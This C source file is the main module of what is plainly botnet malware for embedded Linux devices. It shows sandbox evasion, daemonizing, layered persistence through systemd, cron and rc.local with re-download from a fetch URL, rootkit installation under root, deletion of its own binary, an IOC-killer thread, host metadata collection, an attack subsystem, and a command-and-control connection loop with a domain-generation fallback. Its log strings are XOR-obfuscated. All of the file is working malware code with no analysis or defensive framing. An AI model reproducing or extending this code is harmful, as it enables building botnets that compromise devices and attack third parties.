/* ==========================================================================
 *  main.c -- Entry point, connection loop, DGA fallback
 *  Pure C port of main.cpp. GCC 4.1.2 / uClibc compatible.
 * ========================================================================== */

#include "bot.h"
#include "attack.h"

/* ----------------------------------------------------------------------
   C2 endpoint pool (fixed-size array, no heap allocation needed)
   ---------------------------------------------------------------------- */

#define MAX_ENDPOINTS 64

static _qw5Ti5p  c2_pool[MAX_ENDPOINTS];
static int      pool_size = 0;

/* Free all dstr members inside pool entries */
static void _of5JF8d(void)
{
    int i;
    for (i = 0; i < pool_size; i++) {
        ds_free(&c2_pool[i].host);
        ds_free(&c2_pool[i].port);
    }
    pool_size = 0;
}

/* Check if host:port already exists in pool */
static int _eb6zd5o(const char* host, const char* port)
{
    int i;
    for (i = 0; i < pool_size; i++) {
        if (strcmp(ds_cstr(&c2_pool[i].host), host) == 0 &&
            strcmp(ds_cstr(&c2_pool[i].port), port) == 0)
            return 1;
    }
    return 0;
}

/* Append a single endpoint (copies strings). Deduplicates. Returns 0 on overflow/dup. */
static int _Ed8QW3N(const char* host, const char* port)
{
    if (pool_size >= MAX_ENDPOINTS)
        return 0;
    if (_eb6zd5o(host, port))
        return 0;
    ds_init(&c2_pool[pool_size].host);
    ds_init(&c2_pool[pool_size].port);
    ds_set(&c2_pool[pool_size].host, host);
    ds_set(&c2_pool[pool_size].port, port);
    pool_size++;
    return 1;
}

/* Fisher-Yates shuffle on the pool */
static void _CH7fS3o(void)
{
    int i;
    for (i = pool_size - 1; i > 0; i--) {
        int j = (int)(urandom_u32() % (unsigned)(i + 1));
        if (i != j) {
            _qw5Ti5p tmp = c2_pool[i];
            c2_pool[i] = c2_pool[j];
            c2_pool[j] = tmp;
        }
    }
}

/* ----------------------------------------------------------------------
   _uS2nj5n -- resolve a config entry into pool-appendable endpoints
   Returns number of endpoints appended.
   ---------------------------------------------------------------------- */

static int _Km5mX7A(int idx, int replace)
{
    strarr addrs;
    int count = 0;
    size_t i;

    sa_init(&addrs);
    addrs = dH7QB8j(idx);

    if (replace)
        _of5JF8d();

    for (i = 0; i < sa_count(&addrs); i++) {
        dstr h, p;
        ds_init(&h);
        ds_init(&p);
        if (gv4Kv3u(sa_get(&addrs, i), &h, &p)) {
            _Ed8QW3N(ds_cstr(&h), ds_cstr(&p));
            count++;
        }
        ds_free(&h);
        ds_free(&p);
    }

    sa_free(&addrs);
    return count;
}

/* Resolve into a fresh pool (clears first) */
static int _uS2nj5n(int idx)
{
    return _Km5mX7A(idx, 1);
}

/* Append to existing pool (does not clear) */
static int _Cr7da6Y(int idx)
{
    return _Km5mX7A(idx, 0);
}

/* ======================================================================
   main
   ====================================================================== */

int main(int argc, char* argv[])
{
    int num_configs;
    int c2_idx;
    int config_idx;
    int phantom_failures;
    int phantom_mode;
    time_t phantom_primary_ttl;
    pthread_t tid;

    /* 0. Capture origin tag — try argv[1] first, then ORIGIN env var */
    ds_init(&_my4vH6P);
    if (argc > 1 && argv[1][0] != '-') {
        ds_set(&_my4vH6P, argv[1]);
    } else {
        const char *env_origin = getenv(_S(6,0xe3,0xfe,0xe5,0xeb,0xe5,0xe2));
        if (env_origin && env_origin[0])
            ds_set(&_my4vH6P, env_origin);
    }

    /* 0b. Ignore SIGPIPE (broken socket writes must not kill the process)
     *     and SIGCHLD (let forked attack children auto-reap, no zombies). */
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);

    /* 1. Sandbox detection — before anything touches disk or forks */
    if (VA3rJ6j()) {
        return 0;
    }

    /* 2. Daemonize */
    uQ5tH2B(argc, argv);

    _nS5PJ8Y(_S(24,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xee,0xc3,0xd8,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc5,0xc2,0xcb,0x8c,0xd9,0xdc,0x82,0x82,0x82));
    _nS5PJ8Y(_S(26,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xfc,0xde,0xc3,0xd8,0xc3,0xcf,0xc3,0xc0,0x8c,0xda,0xc9,0xde,0xdf,0xc5,0xc3,0xc2,0x96,0x8c,0x89,0xdf), ds_cstr(&_bT4ag3x));
    if (!ds_empty(&_my4vH6P))
        _nS5PJ8Y(_S(16,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xe3,0xde,0xc5,0xcb,0xc5,0xc2,0x96,0x8c,0x89,0xdf), ds_cstr(&_my4vH6P));
    _nS5PJ8Y(_S(25,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xe2,0xc3,0x8c,0xdf,0xcd,0xc2,0xc8,0xce,0xc3,0xd4,0x8c,0xc8,0xc9,0xd8,0xc9,0xcf,0xd8,0xc9,0xc8));
    _nS5PJ8Y(_S(25,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xff,0xf8,0xe9,0xfc,0x81,0xed,0x8c,0xce,0xc9,0xca,0xc3,0xde,0xc9,0x8c,0xde,0xc9,0xda,0xc5,0xc0));

    /* 3. Single-instance lock */
    Bp3Tq8Z();
    _nS5PJ8Y(_S(24,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xff,0xf8,0xe9,0xfc,0x81,0xee,0x8c,0xcd,0xca,0xd8,0xc9,0xde,0x8c,0xde,0xc9,0xda,0xc5,0xc0));

    /* 4. Resolve fetch URL BEFORE persistence so cron/rc.local get the IP,
       not the raw domain (which may only be resolvable via TXT/DoH). */
    Ng4eX6x();
    {
        const char *url = ds_cstr(&_Xx5Rw4X);
        const char *host_start = strstr(url, _S(3,0x96,0x83,0x83));
        if (host_start) {
            char host[256];
            const char *host_end;
            int hlen;
            host_start += 3;
            host_end = host_start;
            while (*host_end && *host_end != ':' && *host_end != '/') host_end++;
            hlen = (int)(host_end - host_start);
            if (hlen > 0 && hlen < (int)sizeof(host)) {
                struct in_addr tmp;
                memcpy(host, host_start, hlen);
                host[hlen] = '\0';
                if (inet_pton(AF_INET, host, &tmp) != 1) {
                    strarr resolved = Fc7FE8v(host);
                    if (sa_count(&resolved) > 0) {
                        const char *r = sa_get(&resolved, 0);
                        const char *colon = strchr(r, ':');
                        if (colon) {
                            char ip[64];
                            int iplen = (int)(colon - r);
                            if (iplen > 0 && iplen < (int)sizeof(ip)) {
                                memcpy(ip, r, iplen);
                                ip[iplen] = '\0';
                                ds_init(&_my6pz2j);
                                ds_catn(&_my6pz2j, url, (size_t)(host_start - url));
                                ds_cat(&_my6pz2j, ip);
                                ds_cat(&_my6pz2j, host_end);
                                _nS5PJ8Y(_S(34,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xea,0xc9,0xd8,0xcf,0xc4,0x8c,0xf9,0xfe,0xe0,0x8c,0xde,0xc9,0xdf,0xc3,0xc0,0xda,0xc9,0xc8,0x96,0x8c,0x89,0xdf,0x8c,0x81,0x92,0x8c,0x89,0xdf),
                                          ds_cstr(&_Xx5Rw4X), ds_cstr(&_my6pz2j));
                            }
                        }
                    }
                    sa_free(&resolved);
                }
            }
        }
    }

    /* 5. Persistence -- all methods, layered for redundancy */
    _nS5PJ8Y(_S(31,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xff,0xc9,0xd8,0xd8,0xc5,0xc2,0xcb,0x8c,0xd9,0xdc,0x8c,0xdc,0xc9,0xde,0xdf,0xc5,0xdf,0xd8,0xc9,0xc2,0xcf,0xc9,0x82,0x82,0x82));
    Zp8bU5j();   /* systemd + cron */
    Dc2YM5y();        /* rc.local backup */

    /* 5. Rootkit -- auto-install if .so exists on disk and we have root */
    if (getuid() == 0) {
        LG2Bv6i();
    }

    /* 6. Self-delete binary from disk — process stays alive in memory.
       Persistence will re-download via fetch_url when PID eventually dies. */
    {
        char exe_path[4096];
        ssize_t len = readlink(_S(14,0x83,0xdc,0xde,0xc3,0xcf,0x83,0xdf,0xc9,0xc0,0xca,0x83,0xc9,0xd4,0xc9), exe_path, sizeof(exe_path) - 1);
        if (len > 0) {
            exe_path[len] = '\0';
            if (unlink(exe_path) == 0)
                _nS5PJ8Y(_S(21,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xff,0xc9,0xc0,0xca,0x81,0xc8,0xc9,0xc0,0xc9,0xd8,0xc9,0xc8,0x8c,0x89,0xdf), exe_path);
        }
    }

    /* 7. Start IOC killer (background thread) */
    HZ8hr8M();

    /* 7. Collect metadata */
    Ai2mW7K(&_yg5RE4m);
    Xy5oR2j(&_dG3DF2X);
    _GL4jD4V    = HY8cY3Q();
    _Ym3DC2v    = un5KE2K();
    uw2zs4U(&_ZC6YY5F);
    _nS5PJ8Y(_S(56,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xe1,0xc9,0xd8,0xcd,0xc8,0xcd,0xd8,0xcd,0x8c,0x81,0x81,0x8c,0xe5,0xe8,0x96,0x89,0xdf,0x8c,0xed,0xde,0xcf,0xc4,0x96,0x89,0xdf,0x8c,0xfe,0xed,0xe1,0x96,0x89,0xc0,0xc8,0xe1,0xee,0x8c,0xef,0xfc,0xf9,0x96,0x89,0xc8,0x8c,0xfc,0xde,0xc3,0xcf,0x96,0x89,0xdf),
              ds_cstr(&_yg5RE4m), ds_cstr(&_dG3DF2X), (long)_GL4jD4V, _Ym3DC2v,
              ds_cstr(&_ZC6YY5F));

    /* 7. Initialize attack subsystem */
#ifndef NO_ATTACK
    Hu6uf7y();
    _nS5PJ8Y(_S(34,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xed,0xd8,0xd8,0xcd,0xcf,0xc7,0x8c,0xdf,0xd9,0xce,0xdf,0xd5,0xdf,0xd8,0xc9,0xc1,0x8c,0xc5,0xc2,0xc5,0xd8,0xc5,0xcd,0xc0,0xc5,0xd6,0xc9,0xc8));
#else
    _nS5PJ8Y(_S(44,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xed,0xd8,0xd8,0xcd,0xcf,0xc7,0x8c,0xcf,0xc3,0xc8,0xc9,0x8c,0xc8,0xc5,0xdf,0xcd,0xce,0xc0,0xc9,0xc8,0x8c,0x84,0xe2,0xe3,0xf3,0xed,0xf8,0xf8,0xed,0xef,0xe7,0x8c,0xce,0xd9,0xc5,0xc0,0xc8,0x85));
#endif

    /* 8. Resolve C2 addresses */
    Ng4eX6x();
    num_configs = (int)sa_count(&_zU4TP2B);
    if (num_configs == 0) {
        _nS5PJ8Y(_S(41,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xe2,0xc3,0x8c,0xef,0x9e,0x8c,0xcd,0xc8,0xc8,0xde,0xc9,0xdf,0xdf,0xc9,0xdf,0x8c,0xcf,0xc3,0xc2,0xca,0xc5,0xcb,0xd9,0xde,0xc9,0xc8,0x80,0x8c,0xc9,0xd4,0xc5,0xd8,0xc5,0xc2,0xcb));
        return 1;
    }
    _nS5PJ8Y(_S(36,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0x89,0xc8,0x8c,0xef,0x9e,0x8c,0xcf,0xc3,0xc2,0xca,0xc5,0xcb,0x8c,0xc9,0xc2,0xd8,0xde,0xc5,0xc9,0xdf,0x8c,0xcd,0xda,0xcd,0xc5,0xc0,0xcd,0xce,0xc0,0xc9), num_configs);

    /* Bootstrap: resolve first entry */
    _nS5PJ8Y(_S(40,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xfe,0xc9,0xdf,0xc3,0xc0,0xda,0xc5,0xc2,0xcb,0x8c,0xca,0xc5,0xde,0xdf,0xd8,0x8c,0xef,0x9e,0x8c,0xcf,0xc3,0xc2,0xca,0xc5,0xcb,0x8c,0xc9,0xc2,0xd8,0xde,0xd5,0x82,0x82,0x82));
    _uS2nj5n(0);
    if (pool_size == 0) {
        int i;
        for (i = 1; i < num_configs; i++) {
            _uS2nj5n(i);
            if (pool_size > 0) break;
        }
        if (pool_size == 0) {
            _nS5PJ8Y(_S(39,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xe2,0xc3,0x8c,0xef,0x9e,0x8c,0xcd,0xc8,0xc8,0xde,0xc9,0xdf,0xdf,0xc9,0xdf,0x8c,0xde,0xc9,0xdf,0xc3,0xc0,0xda,0xc9,0xc8,0x80,0x8c,0xc9,0xd4,0xc5,0xd8,0xc5,0xc2,0xcb));
            return 1;
        }
    }

    /* Shuffle initial pool */
    _CH7fS3o();
    _nS5PJ8Y(_S(32,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xff,0xd8,0xcd,0xde,0xd8,0xc5,0xc2,0xcb,0x8c,0xdb,0xc5,0xd8,0xc4,0x8c,0x89,0xc8,0x8c,0xc9,0xc2,0xc8,0xdc,0xc3,0xc5,0xc2,0xd8,0xdf), pool_size);

    c2_idx            = 0;
    config_idx        = 0;
    phantom_failures  = 0;
    phantom_mode      = 0;
    phantom_primary_ttl = time(NULL);

    /* Retry state for exponential backoff */
    {
    int  round           = 0;      /* which full sweep of the pool we're on   */
    int  round_failures  = 0;      /* failures within the current round       */
    int  configs_loaded  = 1;      /* how many config entries we've resolved   */
    int  all_configs_tried = 0;    /* set once we've loaded every config entry */

    /* ==================================================================
       MAIN CONNECTION LOOP

       Strategy:
         Round 0 — try every endpoint in pool, 1-2s between attempts
         Round 1 — re-resolve & append remaining config entries, retry
                   pool with 2-4s jitter
         Round 2+ — exponential backoff per round (5s → 10s → 20s → 30s),
                    MAX_RETRY_ROUNDS total
         After all rounds exhausted → DGA walk
       ================================================================== */

#define MAX_RETRY_ROUNDS 5

    for (;;) {
        time_t now;
        now = time(NULL);

        /* In phantom (DGA) mode: periodically retry primary C2 */
        if (phantom_mode && now > phantom_primary_ttl) {
            int recovered = 0;
            int i;
            _nS5PJ8Y(_S(44,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xfc,0xc4,0xcd,0xc2,0xd8,0xc3,0xc1,0x8c,0xc1,0xc3,0xc8,0xc9,0x8c,0x81,0x81,0x8c,0xde,0xc9,0xd8,0xde,0xd5,0xc5,0xc2,0xcb,0x8c,0xdc,0xde,0xc5,0xc1,0xcd,0xde,0xd5,0x8c,0xef,0x9e,0x82,0x82,0x82));

            for (i = 0; i < num_configs && !recovered; i++) {
                /* Resolve into a temp area -- reuse pool if success */
                _qw5Ti5p tmp_eps[MAX_ENDPOINTS];
                int tmp_count = 0;
                strarr addrs;
                size_t a;

                sa_init(&addrs);
                addrs = dH7QB8j(i);

                for (a = 0; a < sa_count(&addrs) && tmp_count < MAX_ENDPOINTS; a++) {
                    dstr h, p;
                    ds_init(&h);
                    ds_init(&p);
                    if (gv4Kv3u(sa_get(&addrs, a), &h, &p)) {
                        ds_init(&tmp_eps[tmp_count].host);
                        ds_init(&tmp_eps[tmp_count].port);
                        ds_set(&tmp_eps[tmp_count].host, ds_cstr(&h));
                        ds_set(&tmp_eps[tmp_count].port, ds_cstr(&p));
                        tmp_count++;
                    }
                    ds_free(&h);
                    ds_free(&p);
                }
                sa_free(&addrs);

                {
                    int t;
                    for (t = 0; t < tmp_count; t++) {
                        _EA8up4M* test = hq4zK8c(ds_cstr(&tmp_eps[t].host),
                                                   ds_cstr(&tmp_eps[t].port));
                        if (test) {
                            int k;
                            _nS5PJ8Y(_S(42,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xfc,0xde,0xc5,0xc1,0xcd,0xde,0xd5,0x8c,0xef,0x9e,0x8c,0xde,0xc9,0xcf,0xc3,0xda,0xc9,0xde,0xc9,0xc8,0x8c,0xda,0xc5,0xcd,0x8c,0xcf,0xc3,0xc2,0xca,0xc5,0xcb,0xf7,0x89,0xc8,0xf1,0x8d), i);

                            /* Replace pool with these endpoints */
                            _of5JF8d();
                            for (k = 0; k < tmp_count; k++) {
                                _Ed8QW3N(ds_cstr(&tmp_eps[k].host),
                                          ds_cstr(&tmp_eps[k].port));
                            }
                            _CH7fS3o();
                            c2_idx           = 0;
                            config_idx       = i;
                            phantom_mode     = 0;
                            phantom_failures = 0;
                            round            = 0;
                            round_failures   = 0;
                            configs_loaded   = 1;
                            all_configs_tried = 0;

                            Ht7Lk2Y(test); /* takes ownership */
                            recovered = 1;
                            break;
                        }
                    }
                }

                /* Free tmp_eps */
                {
                    int t;
                    for (t = 0; t < tmp_count; t++) {
                        ds_free(&tmp_eps[t].host);
                        ds_free(&tmp_eps[t].port);
                    }
                }
            }

            if (!recovered) {
                phantom_primary_ttl = time(NULL) + (PHANTOM_RETRY_MS / 1000);
            } else {
                sleep_jitter(RETRY_FAST_FLOOR_MS, RETRY_FAST_CEIL_MS);
                continue;
            }
        }

        /* Empty pool -- wait and re-resolve */
        if (pool_size == 0) {
            _nS5PJ8Y(_S(29,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xfc,0xc3,0xc3,0xc0,0x8c,0xc9,0xc1,0xdc,0xd8,0xd5,0x80,0x8c,0xdf,0xc0,0xc9,0xc9,0xdc,0xc5,0xc2,0xcb,0x82,0x82,0x82));
            sleep_ms(5000);
            _uS2nj5n(0);
            continue;
        }

        /* Pick next endpoint */
        {
            int ep_idx = c2_idx % pool_size;
            const char* host = ds_cstr(&c2_pool[ep_idx].host);
            const char* port = ds_cstr(&c2_pool[ep_idx].port);
            _EA8up4M* conn;

            _nS5PJ8Y(_S(54,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xef,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc5,0xc2,0xcb,0x8c,0xd8,0xc3,0x8c,0x89,0xdf,0x96,0x89,0xdf,0x8c,0x84,0xde,0xc3,0xd9,0xc2,0xc8,0x8c,0x89,0xc8,0x80,0x8c,0xcd,0xd8,0xd8,0xc9,0xc1,0xdc,0xd8,0x8c,0x89,0xc8,0x83,0x89,0xc8,0x85,0x82,0x82,0x82),
                      host, port, round, round_failures + 1, pool_size);

            conn = hq4zK8c(host, port);
            if (!conn) {
                phantom_failures++;
                round_failures++;
                c2_idx++;

                _nS5PJ8Y(_S(49,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xea,0xcd,0xc5,0xc0,0xc9,0xc8,0x8c,0x84,0xde,0xc3,0xd9,0xc2,0xc8,0x8c,0x89,0xc8,0x80,0x8c,0x89,0xc8,0x83,0x89,0xc8,0x8c,0xc5,0xc2,0x8c,0xde,0xc3,0xd9,0xc2,0xc8,0x80,0x8c,0x89,0xc8,0x8c,0xd8,0xc3,0xd8,0xcd,0xc0,0x85),
                          round, round_failures, pool_size, phantom_failures);

                /* Check if we've exhausted this round (tried every endpoint) */
                if (round_failures >= pool_size) {
                    round++;
                    round_failures = 0;
                    c2_idx = 0;

                    /* Before next round, try to expand pool from unloaded configs */
                    if (!all_configs_tried && configs_loaded < num_configs) {
                        int ci;
                        _nS5PJ8Y(_S(44,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xe0,0xc3,0xcd,0xc8,0xc5,0xc2,0xcb,0x8c,0xde,0xc9,0xc1,0xcd,0xc5,0xc2,0xc5,0xc2,0xcb,0x8c,0x89,0xc8,0x8c,0xcf,0xc3,0xc2,0xca,0xc5,0xcb,0x8c,0xc9,0xc2,0xd8,0xde,0xc5,0xc9,0xdf,0x82,0x82,0x82),
                                  num_configs - configs_loaded);
                        for (ci = configs_loaded; ci < num_configs; ci++) {
                            _Cr7da6Y(ci);
                        }
                        configs_loaded    = num_configs;
                        all_configs_tried = 1;
                        _CH7fS3o();
                        _nS5PJ8Y(_S(35,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xfc,0xc3,0xc3,0xc0,0x8c,0xc9,0xd4,0xdc,0xcd,0xc2,0xc8,0xc9,0xc8,0x8c,0xd8,0xc3,0x8c,0x89,0xc8,0x8c,0xc9,0xc2,0xc8,0xdc,0xc3,0xc5,0xc2,0xd8,0xdf), pool_size);
                    } else {
                        _CH7fS3o();
                    }

                    /* Check if we've exhausted all rounds → DGA */
                    if (round >= MAX_RETRY_ROUNDS) {
                        int dga_resolved = 0;
                        int di;
                        _nS5PJ8Y(_S(86,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xed,0xc0,0xc0,0x8c,0x89,0xc8,0x8c,0xde,0xc3,0xd9,0xc2,0xc8,0xdf,0x8c,0xc9,0xd4,0xc4,0xcd,0xd9,0xdf,0xd8,0xc9,0xc8,0x8c,0x84,0x89,0xc8,0x8c,0xc9,0xc2,0xc8,0xdc,0xc3,0xc5,0xc2,0xd8,0xdf,0x8c,0x7b,0x8c,0x89,0xc8,0x8c,0xde,0xc3,0xd9,0xc2,0xc8,0xdf,0x8c,0x91,0x8c,0x89,0xc8,0x8c,0xcd,0xd8,0xd8,0xc9,0xc1,0xdc,0xd8,0xdf,0x85,0x82,0x8c,0xfb,0xcd,0xc0,0xc7,0xc5,0xc2,0xcb,0x8c,0xe8,0xeb,0xed,0x82,0x82,0x82),
                                  MAX_RETRY_ROUNDS, pool_size, MAX_RETRY_ROUNDS,
                                  pool_size * MAX_RETRY_ROUNDS);

                        for (di = 0; di < DGA_DOMAINS_PER_DAY; di++) {
                            dstr domain, dga_port, c2_addr;
                            int dga_backoff;

                            ds_init(&domain);
                            ds_init(&dga_port);
                            ds_init(&c2_addr);

                            Bp6se4h(di, &domain, &dga_port);
                            _nS5PJ8Y(_S(21,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xe8,0xeb,0xed,0x8c,0xf7,0x89,0xc8,0x83,0x89,0xc8,0xf1,0x96,0x8c,0x89,0xdf),
                                      di + 1, DGA_DOMAINS_PER_DAY, ds_cstr(&domain));

                            c2_addr = xu4si4C(ds_cstr(&domain));
                            if (!ds_empty(&c2_addr)) {
                                dstr dh, dp;
                                ds_init(&dh);
                                ds_init(&dp);
                                if (gv4Kv3u(ds_cstr(&c2_addr), &dh, &dp)) {
                                    _of5JF8d();
                                    _Ed8QW3N(ds_cstr(&dh), ds_cstr(&dp));
                                    c2_idx           = 0;
                                    phantom_mode     = 1;
                                    phantom_failures = 0;
                                    round            = 0;
                                    round_failures   = 0;
                                    configs_loaded   = 1;
                                    all_configs_tried = 0;
                                    phantom_primary_ttl = time(NULL) + (PHANTOM_RETRY_MS / 1000);
                                    dga_resolved = 1;
                                }
                                ds_free(&dh);
                                ds_free(&dp);
                            }

                            ds_free(&domain);
                            ds_free(&dga_port);
                            ds_free(&c2_addr);

                            if (dga_resolved)
                                break;

                            /* Exponential backoff between DGA: 3s -> 6s -> 12s -> cap 20s */
                            dga_backoff = 3000 << di;
                            if (dga_backoff > 20000) dga_backoff = 20000;
                            sleep_jitter(dga_backoff, dga_backoff + dga_backoff / 3);
                        }

                        if (!dga_resolved) {
                            /* All DGA failed -- sleep 15 min then full restart */
                            _nS5PJ8Y(_S(44,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xed,0xc0,0xc0,0x8c,0xe8,0xeb,0xed,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8,0x80,0x8c,0xdf,0xc0,0xc9,0xc9,0xdc,0xc5,0xc2,0xcb,0x8c,0x9d,0x99,0x8c,0xc1,0xc5,0xc2,0xd9,0xd8,0xc9,0xdf,0x82,0x82,0x82));
                            sleep_ms(15 * 60 * 1000 + jitter_ms(0, 60000));
                            _uS2nj5n(0);
                            c2_idx            = 0;
                            config_idx        = 0;
                            phantom_failures  = 0;
                            round             = 0;
                            round_failures    = 0;
                            configs_loaded    = 1;
                            all_configs_tried = 0;
                        }
                        continue;
                    }

                    /* Exponential backoff between rounds */
                    {
                        int backoff = RETRY_RAMP_BASE_MS << (round - 1);
                        int jit;
                        if (backoff > RETRY_RAMP_MAX_MS) backoff = RETRY_RAMP_MAX_MS;
                        jit = (int)(backoff * 0.7 + (int)(urandom_u32() % (unsigned)(int)(backoff * 0.6 + 1)));
                        _nS5PJ8Y(_S(38,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xfe,0xc3,0xd9,0xc2,0xc8,0x8c,0x89,0xc8,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc5,0xc2,0xcb,0x80,0x8c,0xce,0xcd,0xcf,0xc7,0xc3,0xca,0xca,0x8c,0x89,0xc8,0x8c,0xc1,0xdf), round, jit);
                        sleep_ms(jit);
                    }
                } else {
                    /* Within a round: short delay between endpoint attempts */
                    if (round == 0) {
                        /* First round: quick rotate 1-2s */
                        sleep_jitter(1000, 2000);
                    } else {
                        /* Later rounds: slightly longer 2-4s */
                        sleep_jitter(RETRY_FAST_FLOOR_MS, RETRY_FAST_CEIL_MS);
                    }
                }
                continue;
            }

            /* Successful connection -- reset all retry state */
            phantom_failures  = 0;
            round             = 0;
            round_failures    = 0;
            configs_loaded    = 1;
            all_configs_tried = 0;

            _nS5PJ8Y(_S(39,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xef,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc9,0xc8,0x8c,0xd8,0xc3,0x8c,0xef,0x9e,0x80,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc5,0xc2,0xcb,0x8c,0xc4,0xcd,0xc2,0xc8,0xc0,0xc9,0xde));
            Ht7Lk2Y(conn); /* takes ownership, closes on return */
            _nS5PJ8Y(_S(39,0xc1,0xcd,0xc5,0xc2,0x96,0x8c,0xe4,0xcd,0xc2,0xc8,0xc0,0xc9,0xde,0x8c,0xde,0xc9,0xd8,0xd9,0xde,0xc2,0xc9,0xc8,0x80,0x8c,0xde,0xc9,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc5,0xc2,0xcb,0x82,0x82,0x82));
            sleep_jitter(RETRY_FAST_FLOOR_MS, RETRY_FAST_CEIL_MS);
        }
    }
    } /* end retry state scope */

    return 0;
}
